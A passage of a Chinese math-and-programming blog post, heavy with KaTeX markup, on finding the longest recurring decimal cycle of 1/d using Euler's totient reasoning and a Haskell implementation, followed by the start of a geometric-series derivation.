style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>不是 2 或 5 的倍数，也不是质数，但是 10^k mod x 的阶比 10^k mod p 的阶大吗？**也就是</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>φ</mi><mrow><mo fence="true">(</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msubsup><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><mi>φ</mi><mrow><mo fence="true">(</mo><msubsup><mi>p</mi><mi>m</mi><msub><mi>a</mi><mi>m</mi></msub></msubsup><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathrm{gcd}\left( \varphi \left( p_{1}^{a_1} \right) ,\cdots ,\varphi \left( p_{m}^{a_m} \right) \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0163em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>可能比 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 大吗？</p><p>这个数必然小于这些欧拉函数的乘积</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>φ</mi><mrow><mo fence="true">(</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msubsup><mo fence="true">)</mo></mrow><mo>⋯</mo><mi>φ</mi><mrow><mo fence="true">(</mo><msubsup><mi>p</mi><mi>m</mi><msub><mi>a</mi><mi>m</mi></msub></msubsup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi \left( x \right) =\varphi \left( p_{1}^{a_1} \right) \cdots \varphi \left( p_{m}^{a_m} \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0163em;vertical-align:-0.2663em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7463em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>&lt;</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">\varphi \left( x \right)&lt;x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>。而且除了质数 2 之外，p-1 必然是偶数，那么必然存在公因数 2，回到上一个问题，至少在 1000 以内是不可能。在除以 2 之后，一定比 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>小。</p><p>所以，循环节最长的数，一定是质数。假如能证明：</p><ol><li><strong>相邻两个质数 p, q 之间的数，除以 2 之后，一定比 p 小</strong>。</li><li><strong>有限小数乘以无限循环小数，不会改变循环节长度</strong>。</li></ol><p>这似乎已经有相关定理，可以证明第二点，而且可以得到非循环部分的长度。</p><h2 id="常规直观做法">常规直观做法</h2><p>循环小数一定是无限的，而且循环节中的数字可能重复。按照编码方面的经验，不读取到最后一个数字，是无法直到这一串数字，是否是循环节。所以必须设定一个最大可能的循环节长度。</p><p>其次，即使是循环节，那么不一定是最短的循环节，可能是最短循环节的倍数。比如说 001 循环，也会满足 001001 的循环。所以当找到一个循环节时，它的因子的长度，不能是循环节。</p><p>循环的部分，从任意地方选区循环节的长度，它的周期不变。就像 001 循环，实际上只看后半部分，也可以看作时 010 的循环。</p><p>所以，只要跳过足够的小数位，就一定是循环的部分，并且周期不变。那只要按着周期的长度，去找两段匹配上即可。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Generates the decimal representation of 1/deno after the decimal point.</span></span><br><span class="line"><span class="title">afterPoint</span> :: <span class="type">Int</span> -&gt; [<span class="type">Int</span>]</span><br><span class="line"><span class="title">afterPoint</span> = afterPoint&#x27; <span class="number">1</span></span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    afterPoint&#x27; num deno =</span><br><span class="line">      <span class="keyword">let</span> (d, r) = (<span class="number">10</span> * num) `divMod` deno <span class="comment">-- Multiplies numerator by 10, divides by denominator, and keeps remainder.</span></span><br><span class="line">       <span class="keyword">in</span> d : afterPoint&#x27; r deno <span class="comment">-- Recursively continues with remainder as new numerator.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Calculates the length of the recurring cycle in the decimal representation of 1/deno.</span></span><br><span class="line"><span class="title">recurCycle</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">recurCycle</span> deno = recurCycle&#x27; onlyCycle maxPossibleLen</span><br><span class="line">  <span class="keyword">where</span></span><br><span class="line">    maxSkip = myLog2 deno <span class="comment">-- Determines the number of digits to skip based on log base 2 of denominator.</span></span><br><span class="line">    onlyCycle = drop maxSkip $ afterPoint deno <span class="comment">-- Skips initial digits that don&#x27;t participate in the cycle.</span></span><br><span class="line">    maxPossibleLen = deno - <span class="number">1</span> <span class="comment">-- The maximum possible cycle length is deno - 1.</span></span><br><span class="line">    recurCycle&#x27; xs len</span><br><span class="line">      | all (== <span class="number">0</span>) (take maxPossibleLen xs) = <span class="number">0</span> <span class="comment">-- If all digits are zero, cycle length is 0.</span></span><br><span class="line">      | whenLen len &amp;&amp; not (any whenLen (factors len)) = len <span class="comment">-- Checks if current length satisfies cycle conditions.</span></span><br><span class="line">      | otherwise = recurCycle&#x27; xs (len - <span class="number">1</span>) <span class="comment">-- Otherwise, decreases length and tries again.</span></span><br><span class="line">      <span class="keyword">where</span></span><br><span class="line">        whenLen l = (l /= <span class="number">0</span>) &amp;&amp; listEq (take l xs) (drop l xs) <span class="comment">-- Checks if two subsequences of length l are equal.</span></span><br><span class="line">    myLog2 :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line">    myLog2 num = floor $ logBase <span class="number">2</span> (fromIntegral num) <span class="comment">-- Calculates the floor of log base 2 of a number.</span></span><br><span class="line">    listEq [] _ = <span class="type">True</span> <span class="comment">-- Base case for equality check: empty list is equal to any list.</span></span><br><span class="line">    listEq (x : xs) (y : ys) = (x == y) &amp;&amp; listEq xs ys <span class="comment">-- Recursive case: checks if heads are equal and proceeds to tails.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Generates the list of factors of a number by finding divisors up to the square root and their complements.</span></span><br><span class="line"><span class="title">factors</span> :: <span class="type">Int</span> -&gt; [<span class="type">Int</span>]</span><br><span class="line"><span class="title">factors</span> num = <span class="keyword">let</span> halfFactors = filter ((== <span class="number">0</span>) . mod num) [<span class="number">2</span> .. floor . sqrt $ fromIntegral num] <span class="keyword">in</span> halfFactors ++ map (div num) (reverse halfFactors)</span><br></pre></td></tr></table></figure><h2 id="考虑循环节长度特征的做法">考虑循环节长度特征的做法</h2><p>循环小数的循环部分，实际上是一个数乘以几何级数，可以记做</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>0.</mn><mrow><mo fence="true">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo>⋯</mo><msub><mi>a</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><msub><mi>a</mi><mn>1</mn></msub><mo>⋯</mo><msub><mi>a</mi><mi>n</mi></msub><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi mathvariant="normal">∞</mi></munderover><mrow><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mi>i</mi><mi>n</mi></mrow></msup></mrow></mrow><annotation encoding="application/x-tex">0.\left( a_1\cdots a_n \right) =a_1\cdots a_n\sum_{i=1}^{\infty}{10^{-in}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0.</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8747em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">in</span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>根据求和公式，可以得到</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>0.</mn><mrow><mo fence="true">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo>⋯</mo><msub><mi>a</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mfrac><mrow><msub><mi>a</mi><mn>1</mn></msub><mo>⋯</mo><msub><mi>a</mi><mi>n</mi></msub><mrow><mo fence="true">(</mo><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup><mo>−</mo><munder><mrow><mi>lim</mi><mo>⁡</mo></mrow><mrow><mi>i</mi><mo>→</mo><mo>+</mo><mi mathvariant="normal">∞</mi></mrow></munder><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mi>i</mi><mi>n</mi></mrow></msup><mo fence="true">)</mo></mrow></mrow><mrow><mn>1</mn><mo>−</mo><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup></mrow></mfrac><mspace linebreak="newline"></mspace><mo>=</mo><mfrac><mrow><msub><mi>a</mi><mn>1</mn></msub><mo>⋯</mo><msub><mi>a</mi><mi>n</mi></msub><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><munder><mrow><mi>lim</mi><mo>⁡</mo></mrow><mrow><mi>i</mi><mo>→</mo><mo>+</mo><mi mathvariant="normal">∞</mi></mrow></munder><mn>1</mn><msup><mn>0</mn><mrow><mo>−</mo><mi>i</mi><mi>n</mi></mrow></msup><mo fence="true">)</mo></mrow></mrow><mrow><mn>1</mn><msup><mn>0</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">0.\left( a_1\cdots a_n \right) =\frac{a_1\cdots a_n\left( 10^{-n}-\lim_{i\rightarrow +\infty} 10^{-in} \right)}{1-10^{-n}}\\=\frac{a_1\cdots a_n\left( 1-\lim_{i\rightarrow +\infty} 10^{-in} \right)}{10^n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0.</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3593em;vertical-align:-0.7693em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6973em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7713em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">→</span><span class="mord mtight">+</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">in</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3593em;vertical-align:-0.7693em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.59em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.74em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span 